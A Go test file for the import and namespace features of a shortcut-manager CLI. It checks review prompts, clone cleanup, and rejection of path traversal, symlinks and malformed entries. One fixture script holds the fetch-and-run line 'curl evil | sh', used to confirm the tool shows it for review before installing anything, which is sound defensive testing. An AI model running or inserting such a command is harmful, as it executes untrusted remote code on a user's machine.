package cli

import (
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"

	"github.com/StanLukuvka/Shortcut/internal/model"
	"github.com/StanLukuvka/Shortcut/internal/testkit"
)

func hi() map[string]any { return map[string]any{"hi": inline("echo hi")} }

func notContains(t *testing.T, what, text, bad string) {
	t.Helper()
	if strings.Contains(text, bad) {
		t.Errorf("%s: %q contains %q", what, text, bad)
	}
}

func globalNames(e *testkit.Env) []string {
	names := []string{}
	for k := range e.LoadGlobal() {
		names = append(names, k)
	}
	slices.Sort(names)
	return names
}

// nsSource is Python's namespace_source: a folder with <name>.shortcut and the given files (mode 755).
func nsSource(e *testkit.Env, name string, shortcuts map[string]any, files map[string]any) string {
	src := e.Folder(name + "-src")
	raw, _ := json.Marshal(map[string]any{"version": 2, "shortcuts": shortcuts})
	e.WriteFile(filepath.Join(src, name+".shortcut"), string(raw), 0)
	e.WriteFiles(src, files, 0o755)
	return src
}

func filesUnder(t *testing.T, root string) []string {
	t.Helper()
	var out []string
	filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			rel, _ := filepath.Rel(root, p)
			out = append(out, rel)
		}
		return nil
	})
	slices.Sort(out)
	return out
}

// py: test_import.py::test_init_source_without_global_is_refused
func TestImport_InitSourceWithoutGlobalIsRefused(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"x": map[string]any{"description": "x", "inline": "echo x"}}, testkit.Name("source_repo"))
	proj := e.Project(nil)
	res := e.RunWith(in(proj), "init", src)
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "used in place, never copied")
	notExist(t, filepath.Join(proj, ".shortcuts"))
}

// py: test_import.py::test_init_global_skips_a_namespace_name
func TestImport_InitGlobalSkipsANamespaceName(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "keep", "--", "echo keep")
	e.WriteImport(e.Store, "tools", map[string]any{"version": 2, "shortcuts": hi()})
	res := e.Run("init", "--global", e.Collection(map[string]any{"tools": inline("echo t")}), "-y")
	contains(t, "stdout", res.Stdout, "tools (already a namespace)")
	if _, has := e.LoadGlobal()["tools"]; has {
		t.Error("tools was imported as a shortcut")
	}
	eq(t, "keep", e.Run("r", "keep").Stdout, "keep\n")
}

// py: test_import.py::test_init_global_merge_skips
func TestImport_InitGlobalMergeSkips(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "collide", "--", "echo existing")
	ext := e.WriteFile(filepath.Join(e.Tmp, "external_source.sh"), "#!/usr/bin/env bash\necho ext\n", 0)
	src := e.Collection(map[string]any{
		"collide": map[string]any{"description": "collision", "inline": "echo collide"},
		"linked":  map[string]any{"description": "linked", "script": ext},
		"valid":   map[string]any{"description": "valid", "script": "scripts/valid.sh"},
	}, testkit.Name("source_repo"), testkit.Files(map[string]any{"scripts/valid.sh": "#!/usr/bin/env bash\necho valid\n"}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	contains(t, "collide", res.Stdout, "collide (already exists)")
	contains(t, "linked", res.Stdout, "linked (linked external script)")
	reg := e.LoadGlobal()
	eq(t, "valid script", reg["valid"].(map[string]any)["script"], "scripts/valid.sh")
	if !isExec(t, filepath.Join(e.Store, "scripts", "valid.sh")) {
		t.Error("the copied script is not executable")
	}
	if _, has := reg["linked"]; has {
		t.Error("linked was imported")
	}
}

// py: test_import.py::test_init_source_global_cwd_retention
func TestImport_InitSourceGlobalCwdRetention(t *testing.T) {
	e := testkit.New(t)
	fixed := e.Folder("fixed_dir")
	src := e.Collection(map[string]any{
		"fixed_ok":  map[string]any{"description": "ok", "inline": "echo ok", "cwd": fixed},
		"fixed_bad": map[string]any{"description": "missing", "inline": "echo bad", "cwd": "/nonexistent/fixed/xyz"},
		"relative":  map[string]any{"description": "relative", "inline": "echo rel", "cwd": "../sibling"},
		"caller":    map[string]any{"description": "caller", "inline": "echo c", "cwd": "caller"},
		"traversal": map[string]any{"description": "traversal", "script": "../../outside.sh"},
	}, testkit.Name("global_source_repo"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	contains(t, "fixed_bad", res.Stdout, "fixed_bad (cwd not found here: /nonexistent/fixed/xyz)")
	contains(t, "relative", res.Stdout, "relative (exported, but its cwd '../sibling' only exists in the project)")
	contains(t, "traversal", res.Stdout, "traversal (script path escapes the source")
	reg := e.LoadGlobal()
	eq(t, "fixed_ok cwd", reg["fixed_ok"].(map[string]any)["cwd"], fixed)
	if _, has := reg["caller"]; !has {
		t.Error("caller was not imported")
	}
	for _, name := range []string{"fixed_bad", "relative", "traversal"} {
		if _, has := reg[name]; has {
			t.Errorf("%s was imported", name)
		}
	}
}

// py: test_import.py::test_init_git_source_clone
func TestImport_InitGitSourceClone(t *testing.T) {
	e := testkit.New(t)
	repo := e.Collection(map[string]any{"git_cmd": map[string]any{"description": "From git", "script": "scripts/git_cmd.sh"}},
		testkit.Name("git_source_repo"), testkit.Files(map[string]any{"scripts/git_cmd.sh": "#!/usr/bin/env bash\necho from_git\n"}), testkit.Mode(0o755))
	e.CommitToGit(repo) // a local repository: HOME is the sandbox's, so no real git config, and no network
	tmp := e.Folder("tmpdir")
	res := e.RunWith(testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}, "init", "--global", "file://"+repo, "-y")
	eq(t, "exit", res.Code, 0)
	contains(t, "stdout", res.Stdout, "git_cmd")
	eq(t, "run", e.Run("run", "git_cmd").Stdout, "from_git\n")
	eq(t, "the clone is removed", filesUnder(t, tmp), []string(nil))
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("the temporary clone is still there: %v", left)
	}
}

// A failed clone says why and leaves no folder behind (no py counterpart).
func TestImport_FailedCloneIsCleanedUp(t *testing.T) {
	e := testkit.New(t)
	tmp := e.Folder("tmpdir")
	missing := "file://" + filepath.Join(e.Tmp, "no-such-repo")
	res := e.RunWith(testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}, "init", "--global", missing, "-y")
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "error: failed to clone git repository from "+missing+": ")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("the temporary clone is still there: %v", left)
	}
	noGlobalRegistry(t, e)
}

// Ctrl-C at the question, a "no" and a stop by SIGTERM all remove the clone (no py counterpart).
func TestImport_CloneIsRemovedOnCtrlCAndDecline(t *testing.T) {
	e := testkit.New(t)
	repo := e.Collection(hi(), testkit.Name("repo"))
	e.CommitToGit(repo)
	tmp := e.Folder("tmpdir")
	o := testkit.Opts{Env: map[string]string{"TMPDIR": tmp}}
	code, out := e.InTerminal(o, []testkit.Key{{Wait: "import? [y/N]", Signal: syscall.SIGINT}}, "init", "--global", "file://"+repo)
	eq(t, "ctrl-c exit", code, 1)
	contains(t, "ctrl-c", out, "Aborted.")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("after Ctrl-C the clone is still there: %v", left)
	}
	code, out = e.InTerminal(o, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", "file://"+repo)
	eq(t, "decline exit", code, 1)
	contains(t, "decline", out, "Aborted.")
	if left, _ := os.ReadDir(tmp); len(left) != 0 {
		t.Errorf("after a no the clone is still there: %v", left)
	}
	noGlobalRegistry(t, e)
}

// py: test_import.py::test_init_skips_invalid_entries
func TestImport_InitSkipsInvalidEntries(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"not_a_dict":     "echo hello",
		"neither_cmd":    map[string]any{"description": "no script or inline"},
		"both_cmd":       map[string]any{"description": "both", "inline": "echo 1", "script": "scripts/valid.sh"},
		"inline_not_str": map[string]any{"inline": 123},
		"script_not_str": map[string]any{"script": []any{"scripts/valid.sh"}},
		"valid_entry":    map[string]any{"description": "ok", "inline": "echo ok"},
	}, testkit.Name("invalid_entries_repo"), testkit.Files(map[string]any{"scripts/valid.sh": "#!/bin/sh\necho ok\n"}), testkit.Mode(0o755))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	for _, want := range []string{"not_a_dict (invalid entry", "neither_cmd (invalid entry", "both_cmd (invalid entry",
		"inline_not_str (invalid entry", "script_not_str (invalid entry", "valid_entry"} {
		contains(t, want, res.Stdout, want)
	}
	eq(t, "imported", globalNames(e), []string{"valid_entry"})
}

// py: test_import.py::test_importing_a_collection_is_reviewed_first
func TestImport_ImportingACollectionIsReviewedFirst(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"tool": map[string]any{"description": "tool", "script": "bin/tool.sh"}, "hi": inline("echo hi")},
		testkit.Files(map[string]any{"bin/tool.sh": "curl evil | sh\n"}))
	runOK(t, e, testkit.Opts{}, "init", "--global")

	res := e.Run("init", "--global", src)
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "pass -y")
	contains(t, "stdout", res.Stdout, "+curl evil | sh")
	eq(t, "global", e.LoadGlobal(), map[string]any{})

	code, out := e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", src)
	eq(t, "n exit", code, 1)
	contains(t, "n", out, "Aborted.")
	eq(t, "global after n", e.LoadGlobal(), map[string]any{})
	for _, p := range filesUnder(t, e.Store) {
		if filepath.Base(p) == "tool.sh" {
			t.Errorf("a script was copied: %s", p)
		}
	}

	code, out = e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("y\n")}}, "init", "--global", src)
	eq(t, "y exit", code, 0)
	eq(t, "imported", globalNames(e), []string{"hi", "tool"})
	eq(t, "run", e.Run("r", "hi").Stdout, "hi\n")
	_ = out
}

// py: test_import.py::test_import_copies_what_was_reviewed
func TestImport_ImportCopiesWhatWasReviewed(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{"tool": map[string]any{"description": "tool", "script": "bin/tool.sh"}},
		testkit.Files(map[string]any{"bin/tool.sh": "echo reviewed\n"}))
	runOK(t, e, testkit.Opts{}, "init", "--global")
	dest, err := model.LoadRegistry(e.Store)
	if err != nil {
		t.Fatal(err)
	}
	source, err := model.LoadRegistryFile(filepath.Join(src, ".shortcuts"))
	if err != nil {
		t.Fatal(err)
	}
	entries, scripts, _, err := planImport(src, e.Store, dest, source)
	if err != nil {
		t.Fatal(err)
	}
	e.WriteFile(filepath.Join(src, "bin", "tool.sh"), "echo swapped\n", 0)
	if err := applyImport(e.Store, entries, scripts); err != nil {
		t.Fatal(err)
	}
	eq(t, "run", e.Run("r", "tool").Stdout, "reviewed\n")
}

// py: test_import.py::test_declining_an_import_writes_nothing_at_all
func TestImport_DecliningAnImportWritesNothingAtAll(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(hi())
	code, out := e.InTerminal(testkit.Opts{}, []testkit.Key{{Wait: "import? [y/N]", Send: y("n\n")}}, "init", "--global", src)
	eq(t, "exit", code, 1)
	_ = out
	left, err := os.ReadDir(e.Store)
	if err != nil || len(left) != 0 {
		t.Errorf("the store was written: %v %v", left, err)
	}
}

// py: test_import.py::test_an_import_never_replaces_a_stored_script
func TestImport_AnImportNeverReplacesAStoredScript(t *testing.T) {
	e := testkit.New(t)
	e.WriteStore(e.Store, map[string]any{"deploy": map[string]any{"script": "scripts/g_deploy.sh"}})
	mine := e.WriteFile(filepath.Join(e.Store, "scripts", "g_deploy.sh"), "echo mine\n", 0)
	src := e.Collection(map[string]any{"g_deploy": map[string]any{"description": "x", "script": "bin/x.sh"}},
		testkit.Files(map[string]any{"bin/x.sh": "echo EVIL\n"}))
	res := e.Run("init", "--global", src, "-y")
	contains(t, "stdout", res.Stdout, "would replace")
	eq(t, "mine", readFile(t, mine), "echo mine\n")
}

// py: test_import.py::test_import_with_a_closed_stdout_still_imports
func TestImport_ImportWithAClosedStdoutStillImports(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(hi())
	res := e.RunWith(testkit.Opts{CloseFDs: []int{1}}, "init", "--global", src, "-y")
	eq(t, "exit", res.Code, 0)
	if _, has := e.LoadGlobal()["hi"]; !has {
		t.Error("hi was not imported")
	}
}

// py: test_import.py::test_a_source_needs_a_project_file
func TestImport_ASourceNeedsAProjectFile(t *testing.T) {
	e := testkit.New(t)
	src := e.Folder("plain")
	e.WriteStore(src, hi()) // a shortcuts.json, as in a copy of a global store
	res := e.Run("init", "--global", src, "-y")
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "no .shortcuts or <ns>.shortcut found in "+src)
	noGlobalRegistry(t, e)
}

// py: test_import.py::test_import_with_nothing_new_asks_nothing
func TestImport_ImportWithNothingNewAsksNothing(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(hi())
	runOK(t, e, testkit.Opts{}, "new", "hi", "--", "echo mine")
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src)
	contains(t, "stdout", res.Stdout, "already exists")
}

// py: test_import.py::test_a_folder_of_namespaces_is_copied_into_imports_and_needs_approving
func TestImport_AFolderOfNamespacesIsCopiedIntoImportsAndNeedsApproving(t *testing.T) {
	e := testkit.New(t)
	src := nsSource(e, "dk", map[string]any{"ps": map[string]any{"script": "scripts/dk/ps.sh"}, "hi": inline("echo hi")}, map[string]any{
		"scripts/dk/ps.sh":   "#!/usr/bin/env bash\n. \"$(dirname \"$0\")/lib/say\"\nsay ps\n",
		"scripts/dk/lib/say": "say() { echo \"$1\"; }\n"})
	e.WriteFile(filepath.Join(src, "README.md"), "not copied", 0)
	res := e.Run("init", "--global", src)
	eq(t, "exit", res.Code, 1)
	contains(t, "diff", res.Stdout, "+++ b/imports/scripts/dk/lib/say")
	notExist(t, filepath.Join(e.Store, "imports"))
	res = runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	contains(t, "stdout", res.Stdout, "shortcut update dk")
	eq(t, "files", filesUnder(t, filepath.Join(e.Store, "imports")), []string{"dk.shortcut", "scripts/dk/lib/say", "scripts/dk/ps.sh"})
	contains(t, "unapproved", e.Run("r", "dk", "hi").Stderr, "isn't approved yet")
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	eq(t, "ps", e.Run("r", "dk", "ps").Stdout, "ps\n")
	again := e.Run("init", "--global", "-y", src)
	contains(t, "again", again.Stdout, "dk (already a namespace; --replace puts this one in its place)")
}

// py: test_import.py::test_a_namespace_comes_whole_or_not_at_all
func TestImport_ANamespaceComesWholeOrNotAtAll(t *testing.T) {
	e := testkit.New(t)
	outside := e.Script("out.sh", "#!/usr/bin/env bash\n")
	cases := []struct {
		ns        string
		shortcuts map[string]any
		files     map[string]any
		reason    string
	}{
		{"a", map[string]any{"x": map[string]any{"script": "x.sh"}}, map[string]any{"x.sh": "true\n"}, "'x' has its script outside scripts/a/: x.sh"},
		{"b", map[string]any{"x": map[string]any{"script": outside}}, nil, "'x' has its script outside scripts/b/: " + outside},
		{"c", map[string]any{"x": map[string]any{"script": "scripts/c/../../x.sh"}}, map[string]any{"x.sh": "true\n"}, "'x' has its script outside scripts/c/"},
		{"d", map[string]any{"x": map[string]any{"script": "scripts/d/x.sh"}}, nil, "'x' has a missing script: scripts/d/x.sh"},
	}
	for _, c := range cases {
		shortcuts := map[string]any{"ok": inline("true")}
		for k, v := range c.shortcuts {
			shortcuts[k] = v
		}
		src := nsSource(e, c.ns, shortcuts, c.files)
		res := runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
		contains(t, c.ns, res.Stdout, c.ns+" ("+c.reason)
		notExist(t, filepath.Join(e.Store, "imports", c.ns+".shortcut"))
	}
	src := nsSource(e, "e", map[string]any{"x": map[string]any{"script": "scripts/e/x.sh"}}, map[string]any{"scripts/e/real.sh": "true\n"})
	e.Symlink(filepath.Join(src, "scripts", "e", "real.sh"), filepath.Join(src, "scripts", "e", "x.sh"))
	contains(t, "symlink", e.Run("init", "--global", "-y", src).Stdout, "e (symlink in source: scripts/e/x.sh)")
	bad := nsSource(e, "f", map[string]any{}, nil)
	e.WriteFile(filepath.Join(bad, "f.shortcut"), `{"version": 2, "shortcuts": {}, "imports": {}}`, 0)
	contains(t, "nest", e.Run("init", "--global", "-y", bad).Stdout, "namespaces don't nest")
	notExist(t, filepath.Join(e.Store, "imports"))
}

// py: test_import.py::test_replace_puts_a_namespace_in_place_of_the_installed_one
func TestImport_ReplacePutsANamespaceInPlaceOfTheInstalledOne(t *testing.T) {
	e := testkit.New(t)
	src := nsSource(e, "dk", map[string]any{"ps": map[string]any{"script": "scripts/dk/ps.sh"}},
		map[string]any{"scripts/dk/ps.sh": "#!/usr/bin/env bash\necho ps\n", "scripts/dk/old": "old\n"})
	runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	same := runOK(t, e, testkit.Opts{}, "init", "--global", "--replace", src)
	contains(t, "same", same.Stdout, "dk (the same as what's installed)")
	e.WriteFile(filepath.Join(src, "scripts", "dk", "ps.sh"), "#!/usr/bin/env bash\necho new\n", 0)
	removePath(t, filepath.Join(src, "scripts", "dk", "old"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", "--replace", "-y", src)
	contains(t, "head", res.Stdout, "Changes from")
	contains(t, "diff", res.Stdout, "-echo ps\n+echo new")
	eq(t, "folder", filesUnder(t, filepath.Join(e.Store, "imports", "scripts", "dk")), []string{"ps.sh"})
	contains(t, "changed", e.Run("r", "dk", "ps").Stderr, "dk changed since you approved it")
	runOK(t, e, testkit.Opts{}, "update", "-y", "dk")
	eq(t, "run", e.Run("r", "dk", "ps").Stdout, "new\n")
}

// py: test_import.py::test_replace_leaves_an_import_from_elsewhere_and_a_project_source
func TestImport_ReplaceLeavesAnImportFromElsewhereAndAProjectSource(t *testing.T) {
	e := testkit.New(t)
	elsewhere := e.WriteFile(filepath.Join(e.Tmp, "mine", "dk.shortcut"), `{"version": 2, "shortcuts": {"hi": {"inline": "echo hi"}}}`, 0)
	e.WriteStore(e.Store, map[string]any{}, map[string]any{"imports": map[string]any{"dk": elsewhere}})
	src := nsSource(e, "dk", map[string]any{"x": inline("true")}, nil)
	res := e.Run("init", "--global", "--replace", "-y", src)
	contains(t, "stdout", res.Stdout, "dk (imported from "+elsewhere+", so it isn't replaced)")
	contains(t, "elsewhere", readFile(t, elsewhere), `"hi"`)
	project := e.Collection(hi())
	res = e.Run("init", "--global", "--replace", "-y", project)
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "--replace is for a folder of namespaces, and "+project+" has a .shortcuts")
}

// py: test_import.py::test_a_source_with_a_shortcuts_file_says_what_it_leaves_out
func TestImportSkips_ASourceWithAShortcutsFileSaysWhatItLeavesOut(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(hi(), testkit.Files(map[string]any{"extra.shortcut": `{"version": 2, "shortcuts": {}}`}),
		testkit.Extra(map[string]any{"imports": map[string]any{"listed": "listed.shortcut"}}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", "-y", src)
	contains(t, "extra", res.Stdout, "extra.shortcut (a namespace file: a source with a .shortcuts brings only its exported shortcuts)")
	contains(t, "listed", res.Stdout, "imports: listed (namespaces a .shortcuts imports aren't copied)")
	if _, has := e.LoadGlobal()["hi"]; !has {
		t.Error("hi was not imported")
	}
}

// py: test_export.py::test_init_from_a_project_imports_only_exported_entries
func TestExport_InitFromAProjectImportsOnlyExportedEntries(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{
		"tool": map[string]any{"description": "t", "script": "bin/tool", "export": true},
		"here": map[string]any{"inline": "echo here", "export": true},
		"mine": inline("echo mine"),
		"rel":  map[string]any{"inline": "echo rel", "cwd": "sub", "export": true},
	}, testkit.Files(map[string]any{"bin/tool": "#!/bin/sh\necho tool\n"}))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", proj, "-y")
	contains(t, "mine", res.Stdout, "mine (project-only)")
	contains(t, "rel", res.Stdout, "rel (exported, but its cwd 'sub' only exists in the project)")
	reg := e.LoadGlobal()
	eq(t, "names", globalNames(e), []string{"here", "tool"})
	eq(t, "tool", reg["tool"], map[string]any{"description": "t", "script": "scripts/tool.sh"})
	if _, has := reg["here"].(map[string]any)["export"]; has {
		t.Error("here still exports")
	}
	eq(t, "run", e.Run("r", "tool").Stdout, "tool\n")
}

// py: test_export.py::test_init_skips_an_exported_cwd_that_isnt_here
func TestExport_InitSkipsAnExportedCwdThatIsntHere(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{
		"x": map[string]any{"inline": "echo x", "cwd": "/nonexistent/xyz", "export": true},
		"y": map[string]any{"inline": "echo y", "export": true},
	})
	res := e.Run("init", "--global", proj, "-y")
	contains(t, "stdout", res.Stdout, "x (cwd not found here: /nonexistent/xyz)")
	eq(t, "names", globalNames(e), []string{"y"})
}

// py: test_project_files.py::test_a_project_can_be_a_collection
func TestProjectFiles_AProjectCanBeACollection(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{"tool": map[string]any{"description": "t", "inline": "echo tool", "export": true}})
	runOK(t, e, testkit.Opts{}, "init", "--global", proj, "-y")
	if _, has := e.LoadGlobal()["tool"]; !has {
		t.Error("tool was not imported")
	}
}

// py: test_promote.py::test_init_skips_an_entry_with_from
func TestPromote_InitSkipsAnEntryWithFrom(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"x": map[string]any{"inline": "echo x", "from": map[string]any{"source": "/somewhere/proj", "name": "tool"}},
		"y": inline("echo y")})
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	contains(t, "stdout", res.Stdout, "x (invalid entry: 'x' is not a valid entry: 'from' is only for")
	eq(t, "names", globalNames(e), []string{"y"})
}

// py: test_stores.py::test_init_does_not_create_a_project
func TestStores_InitDoesNotCreateAProject(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(nil, testkit.Name("empty_init_proj"))
	res := e.RunWith(in(proj), "init")
	eq(t, "exit", res.Code, 1)
	contains(t, "stderr", res.Stderr, "a file you write by hand")
	if left, _ := os.ReadDir(proj); len(left) != 0 {
		t.Errorf("init wrote %v", left)
	}
}

// py: test_stores.py::test_init_global_leaves_an_existing_store_alone
func TestStores_InitGlobalLeavesAnExistingStoreAlone(t *testing.T) {
	e := testkit.New(t)
	runOK(t, e, testkit.Opts{}, "new", "keep", "--", "echo keep")
	res := e.Run("init", "--global")
	contains(t, "stdout", res.Stdout, "Global store already exists")
	eq(t, "keep", e.Run("r", "keep").Stdout, "keep\n")
}

// py: test_stores.py::test_malformed_entries_never_crash
func TestStores_MalformedEntriesNeverCrash(t *testing.T) {
	e := testkit.New(t)
	proj := e.Project(map[string]any{"bad": "echo hi"}, testkit.Name("proj_a5"))
	res := e.RunWith(in(proj), "update", "-y")
	eq(t, "update exit", res.Code, 1)
	contains(t, "update", res.Stderr, "expected a dictionary")

	// The global store isn't approved, so a bad entry can reach `run`
	e.WriteStore(e.Store, map[string]any{"bad": "echo hi"})
	for _, cwd := range []string{proj, e.Tmp} {
		res = e.RunWith(in(cwd), "run", "bad")
		eq(t, "run exit", res.Code, 1)
		if !strings.HasPrefix(strings.TrimSpace(res.Stderr), "error:") {
			t.Errorf("stderr %q", res.Stderr)
		}
		notContains(t, "traceback", res.Stderr, "Traceback")
	}
	src := e.Collection(map[string]any{"bad_dir": map[string]any{"description": "Bad dir", "inline": "echo hi", "cwd": 123}}, testkit.Name("src_a5"))
	res = e.Run("init", "--global", src, "-y")
	eq(t, "init exit", res.Code, 0)
	contains(t, "init", res.Stdout, "bad_dir (invalid entry: 'bad_dir' is not a valid entry: 'cwd' must be a string")
	notContains(t, "traceback", res.Stderr, "Traceback")
}

// py: test_symlink_safety.py::test_init_skips_symlinked_source_script
func TestSymlinkSafety_InitSkipsSymlinkedSourceScript(t *testing.T) {
	e := testkit.New(t)
	src := e.Collection(map[string]any{
		"sym_script":  map[string]any{"description": "symlink script", "script": "scripts/sym_target.sh"},
		"real_script": map[string]any{"description": "real script", "script": "scripts/real.sh"},
	}, testkit.Name("symlink_source_repo"), testkit.Files(map[string]any{"scripts/real.sh": "#!/bin/sh\necho real\n"}), testkit.Mode(0o755))
	e.Symlink(filepath.Join(src, "scripts", "real.sh"), filepath.Join(src, "scripts", "sym_target.sh"))
	res := runOK(t, e, testkit.Opts{}, "init", "--global", src, "-y")
	contains(t, "sym", res.Stdout, "sym_script (symlink in source)")
	contains(t, "real", res.Stdout, "real_script")
	eq(t, "names", globalNames(e), []string{"real_script"})
	copied := filepath.Join(e.Store, "scripts", "real_script.sh")
	if st, err := os.Lstat(copied); err != nil || !st.Mode().IsRegular() {
		t.Errorf("the copy is not a regular file: %v %v", st, err)
	}
}

// pySuffix is pathlib's suffix, which the copy's name is made from (no py counterpart).
func TestImport_PySuffix(t *testing.T) {
	for in, want := range map[string]string{"a/b.sh": ".sh", "bin/tool": "", ".hidden": "", "x.": "", "a.tar.gz": ".gz", "dir.d/": ".d", "": ""} {
		if got := pySuffix(in); got != want {
			t.Errorf("pySuffix(%q) = %q, want %q", in, got, want)
		}
	}
}
